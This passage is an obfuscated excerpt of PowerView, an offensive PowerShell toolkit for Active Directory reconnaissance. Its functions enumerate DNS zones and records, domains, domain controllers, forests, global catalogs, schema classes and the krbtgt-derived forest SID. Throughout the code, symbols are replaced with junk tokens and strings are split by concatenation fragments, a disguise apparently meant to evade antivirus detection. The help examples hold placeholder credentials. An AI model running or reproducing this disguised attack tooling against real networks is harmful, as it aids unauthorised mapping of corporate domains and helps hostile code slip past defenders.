            gIF1IP = Zfr{0}.{1}.{2}.{3}Zfr -f gIF1DNSRecord[24], gIF1DNSRecord[25], gIF1DNSRecord[26], gIF1DNSRecord'+'[27]
            gIF1Data = gIF1IP
            gIF1DNSRecordObject U9B Add-Member Noteproperty 41aRecordType41a 41aA41a
        }

        elseif (gIF1RDataType -eq 2) {
            gIF1NSName = Get-Name gIF1DNSRecord[24..gIF1DNSRecord.length]
            gIF1Data = gIF1NSName
            gIF1DNSRecordObject U9B Add-Member Noteproperty 41aRecordType41a 41aNS41a
        }

        elseif (gIF1RDataType -eq 5) {
            gIF1Alias = Get-Name gIF1DNSRecord[24..gIF1DNSRecord.length]
            gIF1Data = gIF1Alias
            gIF1DNSRecordObject U9B Add-Member Noteproperty 41aRecordType41a 41aCNAME41a
        }

        elseif (gIF1RDataType -eq 6) {
            # TODO: how to implement properly? nested object?
            gIF1Data = gIF1([System.Convert]::ToBase64String(gIF1DNSRecord[24..gIF1DNSRecord.length]))
            gIF1DNSRecordObject U9B Add-Member Noteproperty 41aRecordType41a 41aSOA41a
        }

        elseif (gIF1RDataType -eq 12) {
            gIF1Ptr = Get-Name gIF1DNSRecord[24..gIF1DNSRecord.length]
            gIF1Data = gIF1Ptr
            gIF1DNSRecordObject U9B Add-Member Noteproperty 41aRecordType41a 41aPTR41a
        }

        elseif (gIF1RDataType -eq 13) {
            # TODO: how to implement properly? nested object?
            gIF1Data = gIF1([System.Convert]::ToB'+'ase64String(gIF1DNSRecord[24..gIF1DNSRecord.length]))
            gIF1DNSR'+'ecordObject U9B Add-Member Noteproperty 41aRecordType41a 41aHINFO41a
        }

        elseif (gIF1RDataType -eq 15) {
            # TODO: how to implement properly? nested object?
            gIF1Data = gIF1([System.Convert]::ToBase64String(gIF1DNSRecord[24..gIF1DNSRecord.length]))
            gIF1DNS'+'RecordObject U9B Add-Member Noteproperty 41aRecordType41a 41aMX41a
        }

        elseif (gIF1RDataType -eq 16) {
            [string]gIF1TXT  = 41a41a
            [int]gIF1SegmentLength = gIF1DNSRecord[24]
            gIF1Index = 25

            while (gIF1SegmentLength-- -gt 0) {
                gIF1TXT += [char]gIF1DNSRecord[gIF1index++]
            }

            gIF1Data = gIF1TXT
            gIF1DNSRecordObject U9B Add-Member Noteproperty 41aRecordType41a 41aTXT41a
        }

        elseif (gIF1RDataType -eq 28) {
            # TODO: how to implement properly? nested object?
            gIF1Data = gIF1([System.Convert]::ToBase64String(gIF1DNSRecord[24..gIF1DNSRecord.length]))
            gIF1DNSRecordObject U9B Add-Member Noteproperty 41aRecordType41a 41aAAAA41a
        }

        elseif (gIF1RDataType -eq 33) {
            # TODO: how to implement properly? nested object?
            gIF1Data = gIF1([System.Convert]::ToBase64String(gIF1DNSRecord[24..gIF1DNSRecord.length]))
            gIF1DNSRecordObject U9B Add-Member Noteproperty 41aRecordType41a 41aSRV41a
        }

        else {
            gIF1Data = gIF1([System.Convert]::ToBase64String(gIF1DNSRecord[24..gIF1DNSRecord.length]))
            gIF1DNSRecordObject U9B Add-Member Noteproperty 41aRecordType41a 41aUNKNOWN41a
        }

        gIF1DNSRecordObject U9B Add-Member Noteproperty 41aUpdatedAtSerial41a gIF1UpdatedAtSerial
        gIF1DNSRecordObject U9B Add-Member Noteproperty 41aTTL41a gIF1TTL
        gIF1DNSRecordObject U9B Add-Member Noteproperty 41aAge41a gIF1Age
        gIF1DNSRecordObject U9B Add-Member Noteproperty 41aTimeStamp41a gIF1TimeStamp
        gIF1DNSRecordObject U9B Add-Member Noteproperty 41aData41a gIF1Data
        gIF1DNSRecordObject
    }
}


function Get-DomainDNSZone {
<#
.SYNOPSIS

Enumerates the Active Directory DNS zones for a given domain.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty  

.PARAMETER Domain

The domain to query for zones, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to for the search.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainDNSZone

Retrieves the DNS zones for the current domain.

.EXAMPLE

Get-DomainDNSZone -Domain dev.testlab.local -Server primary.testlab.local

Retrieves the DNS zones for the dev.testlab.local domain, binding to primary.testlab.local.

.OUTPUTS

PowerView.DNSZone

Outputs custom PSObjects with detailed information about the DNS zone.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType(41aPowerView.DNSZone41a)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True)]
        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [ValidateNotNullOrEmpty()]
        [String[]]
        gIF1Properties,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ServerTimeLimit,

        [Alias(41aReturnOne41a)]
        [Switch]
        gIF1FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        gIF1SearcherArguments = @{
            41aLDAPFilter41a = 41a(objectClass=dnsZone)41a
        }
        if (gIF1PSBoundParameters[41aDomain41a]) { gIF1SearcherArguments[41aDomain41a] = gIF1Domain }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1SearcherArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aProperties41a]) { gIF1SearcherArguments[41aProperties41a] = gIF1Properties }
        if (gIF1PSBo'+'undParameters[41aResultPageSize41a]) { gIF1SearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1SearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1SearcherArgument'+'s[41aCredential41a] = gIF1Credential }
        gIF1DNSSearcher1 = Get-DomainSearcher @SearcherArguments

        if (gIF1DNSSearcher1) {
            if (gIF1PSBoundParameters[41aFindOne41a]) { gIF1Results = gIF1DNSSearcher1.FindOne()  }
            else { gIF1Results = gIF1DNSSearcher1.FindAll() }
            gIF1Results U9B Where-Object {gIF1_} U9B ForEach-Object {
                gIF1Out = Convert-LDAPProperty -Properties gIF1_.Properties
                gIF1Out U9B Add-Member NoteProperty 41aZoneName41a gIF1Out.name
                gIF1Out.PSObject.TypeNames.Insert(0, 41aPowerView.DNSZone41a)
                gIF1Out
            }

            if (gIF1Results) {
                try { gIF1Results.dispose() }
                catch {
                    Write-Verbose Zfr[Get-DomainDFSShare] Error disposing of the Results object: gIF1_Zfr
                }
            }
            gIF1DNSSearcher1.dispose()
        }

        gIF1SearcherArguments[41aSearchBasePrefix41a] = 41aCN=MicrosoftDNS,DC=DomainDnsZones41a
        gIF1DNSSearcher2 = Get-DomainSearcher @SearcherArguments

        if (gIF1DNSSearcher2) {
            try {
                if (gIF1PSBoundParameters[41aFindOne41a]) { gIF1Results = gIF1DNSSearcher2.FindOne() }
                else { gIF1Results = gIF1DNSSearcher2.FindAll() }
         '+'       gIF1Results U9B Where-Object {gIF1_} U9B ForEach-Object {
                    gIF1Out = Convert-LDAPProperty -Properties gIF1_.Properties
                    gIF1Out U9B Add-Member NoteProperty 41aZoneName41a gIF1Out.name
                    gIF1Out.PSObject.TypeNames.Insert(0, 41aPowerView.DNSZone41a)
                    gIF1Out
                }
                if (gIF1Results) {
                    try { gIF1Results.dispose() }
                    catch {
                        Write-Verbose Zfr[Get-DomainDNSZone] Error disposing of the Results object: gIF1_Zfr
                    }
                }
            }
            catch {
                Write-Verbose Zfr[Get-DomainDNSZone] Error accessing 41aCN=MicrosoftDNS,DC=DomainDnsZones41aZfr
            }
            gIF1DNSSearcher2.dispose()
        }
    }
}


function Get-DomainDNSRecord {
<#
.SYNOPSIS

Enumerates the Active Directory DNS records for a given zone.'+'

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty, Convert-DNSRecord  

.DESCRIPTION

Given a specific Active Directory DNS zone name, query for all 41adnsNode41a
LDAP entries using that zone as the search base. Return all DNS entry results
and use Convert-DNSRecord to try to convert the binary DNS record blobs.

.PARAMETER ZoneName

Specifies the zone to query for records (which can be enumearted with Get-DomainDNSZone).

.PARAMETER Domain

The domain to query for zones, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to for the search.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainDNSRecord -ZoneName testlab.local

Retrieve all records for the testlab.local zone.

.EXAMPLE

Get-DomainDNSZone U9B Get-DomainDNSRecord

Retrieve all records for all zones in the current domain.

.EXAMPLE

Get-DomainDNSZone -Domain dev.testlab.local U9B Get-DomainDNSRecord -Domain dev.testlab.local

Retrieve all records for all zones in the dev.testlab.local domain.

.OUTPUTS

PowerView.DNSRecord

Outputs custom PSObjects with detailed information about the DNS record entry.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType(41aPowerView.DNSRecord41a)]
    [CmdletBinding()]
    Para'+'m(
        [Parameter(Position = 0,  Mandatory = gIF1True, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [ValidateNotNullOrEmpty()]
        [String]
        gIF1ZoneName,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [ValidateNotNullOrEmpty()]
        [String[]]
        gIF1Properties = 41aname,distinguishedname,dnsrecord,whencreated,whenchanged41a,

        [Vali'+'dateRange(1, 10000)]
        [Int]
        gIF1ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ServerTimeLimit,

        [Alias(41aReturnOne41a)]
        [Switch]
        gIF1FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        gIF1SearcherArguments = @{
            41aLDAPFilter41a = 41a(objectClass=dnsNode)41a
            41aSearchBasePrefix41a = ZfrDC=gIF1(gIF1ZoneName),CN=MicrosoftDNS,DC=DomainDnsZonesZfr
        }
        if (gIF1PSBoundParameters[41aDomain41a]) { gIF1SearcherArguments[41aDomain41a] = gIF1Domain }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1SearcherArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aProperties41a]) { gIF1SearcherArguments[41aProperties41a] = gIF1Properties }
        if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1SearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1SearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1SearcherArguments[41aCredential41a] = gIF1Credential }
        gIF1DNSSearcher = Get-DomainSearcher @SearcherArguments

        if (gIF1DNSSearcher) {
            if (gIF1PSBoundParameters[41aFindOne41a]) { gIF1Results = gIF1DNSSearcher.FindOne() }
            else { gIF1Results = gIF1DNSSearcher.FindAll() }
            gIF1Results U9B Where-Object {gIF1_} U9B ForEach-Object {
                try {
                    gIF1Out = Convert-LDAPProperty -Properties gIF1_.Properties U9B Select-Object name,distinguishedname,dnsrecord,whencreated,whenchanged
                    gIF1Out U9B Add-Member NoteProperty 41aZoneName41a gIF1ZoneName

                    # convert the record and extract the properties
                    if (gIF1Out.dnsrecord -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                        # TODO: handle multiple nested records properly?
                        gIF1'+'Record = Convert-DNSRecord -DNSRecord gIF1Out.dnsrecord[0]
                    }
                    else {
                        gIF1Record = Convert-DNSRecord -DNSRecord gIF1Out.dnsrecord
                    }

                    if (gIF1Record) {
                        gIF1Record.PSObject.Properties U9B ForEach-Object {
                            gIF1Out U9B Add-Member NoteProperty gIF1_.Name gIF1_.Value
                        }
                    }

                    gIF1Out.PSObject.Type'+'Names.Insert(0, 41aPowerView.DNSRecord41a)
                    gIF1Out
                }
                catch {
                    Write-Warning Zfr[Get-DomainDNSRecord] Error: gIF1_Zfr
                    gIF1Out
                }
            }

            if (gIF1Results) {
                try { gIF1Results.dispose() }
                catch {
                    Write-Verbose Zfr[Get-DomainDNSRecord] Error disposing of the Results object: gIF1_Zfr
                }
            }
            gIF1DNSSearcher.dispose()
        }
    }
}


function Get-Domain {
<#
.SYNOPSIS

Returns the domain object for the current (or specified) domain.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Returns a System.DirectoryServices.ActiveDirectory.Domain object for the current
domain or the domain specified with -Domain X.

.PARAMETER Domain

Specifies the domain n'+'ame to query for, defaults to the current domain.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target do'+'main.

.EXAMPLE

Get-Domain -Domain testlab.local

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Get-Domain -Credential gIF1Cred

.OUTPUTS

System.DirectoryServices.ActiveDirectory.Domain

A complex .NET domain object.

.LINK

http://social.technet.microsoft.com/Forums/scriptcenter/en-US/0c5b3f83-e528-4d49-92a4-dee31f4b481c/finding-the-dn-of-the-the-domain-without-admodule-in-powershell?forum=ITCG
#>

    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True)]
        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if (gIF1PSBoundParameters[41aCredential41a]) {

            Write-Verbose 41a[Get-Domain] Using alternate credentials for Get-Domain41a

            if (gIF1PSBoundParameters[41aDomain41a]) {
                gIF1Targ'+'etDomain = gIF1Domain
            }
            else {
                # if no domain is supplied, extract the logon domain from the PSCredential passed
                gIF1TargetDomain = gIF1Credential.GetNetworkCredential().Domain
                Write-Verbose Zfr[Get-Domain] Extracted domain 41agIF1TargetDomain41a from -CredentialZfr
            }

            gIF1DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(41aDomain41a, gIF1TargetDomain, gIF1Credential.UserName, gIF1Credential.GetNetworkCredential().Password)

            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain(gIF1DomainContext)
            }
            catch {
                Write-Verbose Zfr[Get-Domain] The specified domain 41agIF1TargetDomain41a does not exist, could not be contacted, there isn41at an existing trust, or the specified credentials are invalid: gIF1_Zfr
            }
        }
        elseif (gIF1PSBoundParameters[41aDomain41a]) {
        '+'    gIF1DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(41aDomain41a, gIF1Domain)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain(gIF1DomainContext)
            }
            catch {
    '+'            Write-Verbose Zfr[Get-Domain] The specified domain 41agIF1Domain41a does not exist, could not be contacted, or there isn41at an existing trust : gIF1_Zfr
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                Write-Verbose Zfr[Get-Domain] Error retrieving the current domain: gIF1_Zfr
            }
        }
    }
}


function Get-DomainController {
<#
.SYNOPSIS

Return the domain controllers for the current (or specified) domain.

Author: Will Schr'+'oeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainComputer, Get-Domain  

.DESCRIPTION

Enumerates the domain controllers for the current or specified domain.
By default built in .NET methods are used. The -LDAP switch uses Get-DomainComputer
to search for domain controllers.

.PARAMETER Domain

The domain to query for domain controllers, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER LDAP

Switch. Use LDAP queries to determine the domain controllers instead of built in .NET methods.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainController -Domain 41atest.local41a

Determine the domain controllers for 41atest.local41a.

.EXAMPLE

Get-DomainController -Domain 41atest.local41a -LDAP

Determine the domain controllers for 41atest.local41a using LDAP queries.

.EXAMPLE

41atest.local41a U9B Get-DomainController

Determine the domain controllers for 41atest.local41a.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Get-DomainController -Credential gIF1Cred

.OUTPUTS

PowerView.Computer

Outputs custom PSObjects with details about the enumerated domain controller if -LDAP is specified.

System.DirectoryServices.ActiveDirectory.DomainController

If -LDAP isn41at specified.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType(41aPowerView.Computer41a)]
    [OutputType(41aSystem.DirectoryServices.ActiveDirectory.DomainController41a)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True)]
        [String]
        gIF1Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [Switch]
        gIF1LDAP,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        gIF1Arguments = @{}
        if (gIF1PSBoundParameters[41aDomain41a]) { gIF1Arguments[41aDomain41a] = gIF1Domain }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1Arguments[41aCredential41a] = gIF1Credential }

        if (gIF1PSBoundParameters[41aLDAP41a] -or gIF1PSBoundParameters[41aServer41a]) {
            if (gIF1PSBoundParameters[41aServer41a]) { gIF1Arguments[41aServer41a] = gIF1Server }

            # UAC specification for domain controllers
            gIF1Arguments[41aLDAPFilter41a] = 41a(userAccountControl:1.2.840.113556.1.4.803:=8192)41a

            Get-DomainComputer @Arguments
        }
        else {
            gIF1FoundDomain = Get-Domain @Arguments
            if (gIF1FoundDomain) {
                gIF1FoundDomain.DomainControllers
            }
        }
    }
}


function Get-Forest {
<#
.SYNOPSIS

Returns the forest object for the current (or specified) forest.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: ConvertTo-SID  

.DESCRIPTION

Returns a System.DirectoryServices.ActiveDirectory.Forest object for the current
forest or the forest specified with -Forest X.

.PARAMETER Forest

The forest name to query for, defaults to the current forest.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target forest.

.EXAMPLE

Get-Forest -Forest external.domain

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Get-Forest -Credential gIF1Cred

.OUTPUTS

System.Management.Automation.PSCustomObject

Outputs a PSObject containing System.DirectoryServices.ActiveDirectory.Forest in addition
to the forest root domain SID.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType(41aSystem.Management.Automation.PSCustomObject41a)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True)]
        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if (gIF1PSBoundParameters[41aCredential41a]) {

            Write-Verbose Zfr[Get-Forest] Using alternate credentials for Get-ForestZfr

            if (gIF1PSBoundParameters[41aForest41a]) {
                gIF1TargetForest = gIF1Forest
            }
            else {
                # if no domain is supplied, extract the logon domain from the PSCredential passed
                gIF1TargetForest = gIF1Credential.GetNetworkCredential().Domain
                Write-Verbose Zfr[Get-Forest] Extracted domain 41agIF1Forest41a from -CredentialZfr
            }

            gIF1ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(41aForest41a, gIF1TargetForest, gIF1Credential.UserName, gIF1Credential.GetNetworkCredential().Password)

            try {
                gIF1ForestObject = [System.DirectoryServices.ActiveDirectory.Fores'+'t]::GetForest(gIF1ForestContext)
            }
            catch {
                Write-Verbose Zfr[Get-Forest] The specif'+'ied forest 41agIF1TargetForest41a does not exist, could not be contacted, there isn41at an existing trust, or the specified credentials are invalid: gIF1_Zfr
                gIF1Null
            }
        }
        elseif (gIF1PSBoundParameters[41aForest41a]) {
            gIF1ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(41aForest41a, gIF1Forest)
            try {
                gIF1ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest(gIF1ForestContext)
            }
            catch {
                Write-Verbose Zfr[Get-Forest] The specified forest 41agIF1Forest41a does not exist, could not be contacted, or there isn41at an existing trust: gIF1_Zfr
                return gIF1Null
            }
        }
        else {
            # otherwise use the current forest
            gIF1ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
        }

        if (gIF1ForestObject) {
            # get the SID of the forest root
            if (gIF1PSBoundParameters[41aCredential41a]) {
                gIF1ForestSid = (Get-DomainUser -Identity ZfrkrbtgtZfr -Domain gIF1ForestObject.RootDomain.Name -Credential gIF1Credential).objectsid
            }
            else {
                gIF1ForestSid = (Get-DomainUser -Identity ZfrkrbtgtZfr -Domain gIF1ForestObject.RootDomain.Name).objectsid
            }

            gIF1Parts = gIF1ForestSid -Split 41a-41a
            gIF1ForestSid = gIF1Parts[0..gIF1(gIF1Parts.length-2)] -join 41a-41a
            gIF1ForestObject U9B Add-Member NoteProperty 41aRootDomainSid41a gIF1ForestSid
            gIF1ForestObject
        }
    }
}


function Get-ForestDomain {
<#
.SYNOPSIS

Return all domains for the current (or specified) forest.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Forest  

.DESCRIPTION

Returns all domains for the current forest or the forest specified
by -Forest X.

.PARAMETER Forest

Specifies the forest name to query for domains.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target forest.

.EXAMPLE

Get-ForestDomain

.EXAMPLE

Get-ForestDomain -Forest external.local

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Get-ForestDomain -Credential gIF1Cred

.OUTPUTS

System.DirectoryServices.ActiveDirectory.Domain
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType(41aSystem.DirectoryServices.ActiveDirectory.Domain41a)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True)]
        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        gIF1Arguments = @{}
        if (gIF1PSBoundParameters[41aForest41a]) { gIF1Arguments[41aForest41a] = gIF1Forest }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1Arguments[41aCredential41a] = gIF1Credential }

        gIF1ForestObject = Get-Forest @Arguments
        if (gIF1ForestObject) {
            gIF1ForestObject.Domains
        }
    }
}


function Get-ForestGlobalCatalog {
<#
.SYNOPSIS

Return all global catalogs for the current (or specified) forest.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Forest  

.DESCRIPTION

Returns all global catalogs for the current forest or the forest specified
by -Forest X by using Get-Forest to retrieve the specified forest object
and the .FindAllGlobalCatalogs() to enumerate the global catalogs.

.PARAMETER Forest

Specifies the forest name to query for global catalogs.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-ForestGlobalCatalog

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Get-ForestGlobalCatalog -Credential gIF1Cred

.OUTPUTS

System.DirectoryServices.ActiveDirectory.GlobalCatalog
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType(41aSystem.Dire'+'ctoryServices.ActiveDirectory.GlobalCatalog41a)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True)]
        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        gIF1Arguments = @{}
        if (gIF1PSBoundParameters[41aForest41a]) { gIF1Arguments[41aForest41a] = gIF1Forest }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1Arguments[41aCredential'+'41a] = gIF1Credential }

        gIF1ForestObject = Get-Forest @Arguments

        if (gIF1ForestObject) {
            gIF1ForestObject.FindAllGlobalCatalogs()
        }
    }
}


function Get-ForestSchemaClass {
<#
.SYNOPSIS

Helper that returns the Active Directory schema classes for the current
(or specified) forest or returns just the schema class specified by
-ClassName X.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Forest  

.DESCRIPTION

Uses Get-Forest to retrieve the current (or specified) forest. By default,
the .FindAllClasses() method is executed, returning a collection of
[DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass] results.
If Zfr-FindClass XZfr is specified, the [DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass]
result for the specified class name is returned.

.PARAMETER ClassName

Specifies a ActiveDirectorySchemaClass name in the found schema to return.

.PARAMETER Forest

The forest to query for the schema, defaults to the current forest.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

G'+'et-ForestSchemaClass

Returns all domain schema classes for the current forest.

.EXAMPLE

Get-ForestSchemaClass -Forest dev.testlab.local

Returns all domain schema classes for the external.local forest.

.EXAMPLE

Get-ForestSchemaClass -ClassName user -Forest external.local

Returns the user schema class for the external.local domain.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Get-ForestSchemaClass -ClassName user -Forest external.local -Credential gIF1Cred

Returns the user schema class for the external.local domain using
the specified alternate credentials.

.OUTPUTS

[DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass]

An ActiveDirectorySchemaClass returned from the found schema.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [Outpu'+'tType([System.DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True)]
        [Alias(41aClass41a)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        gIF1ClassName,

        [Alias(41aName41a)]
        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        gIF1Arguments = @{}
        if (gIF1PSBoundParameters[41aForest41a]) { gIF1Arguments[41aForest41a] = gIF1Forest }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1Arguments[41aCredential41a] = gIF1Credential }

        gIF1ForestObject = Get-Forest @Arguments

        if (gIF1ForestObject) {
            if (gIF1PSBoundParameters[41aClassName41a]) {
                ForEach (gIF1TargetClass in gIF1ClassName) {
                    gIF1ForestObject.Schema.FindClass(gIF1TargetClass)
                }
            }
            else {
                gIF1ForestObject.Schema.FindAllClasses()
            }
        }
    }
}


function Find-DomainObjectPropertyOutlier {
<#
.SYNOPSIS

Finds user/group/computer objects in AD that have 41aoutlier41a prope'+'rties set.

Author: Will Schroeder (@harmj0y), Matthew Graeber (@mattifestation)  
License: BSD 3-Clause  
Required Dependencies: Get-Domain, Get-DomainUser, Get-DomainGroup, Get-DomainComputer

.DESCRIPTION

A 41areference41a set of property names is calculated, either from a standard set preserved
for user/group/computers, or from the array of names passed to -ReferencePropertySet, or
from the property names of the passed -ReferenceObject. Every user/group/computer object
(depending on determined class) are enumerated, and for each object, if the object has a
41anon-standard41a property set (meaning a property not held by the reference set), the object41as
samAccountName, property name, and property value are output to the pipeline.

.PARAMETER ClassName

Specifies the AD object class to find property outliers for, 41auser41a, 41agroup41a, or 41acomputer41a.
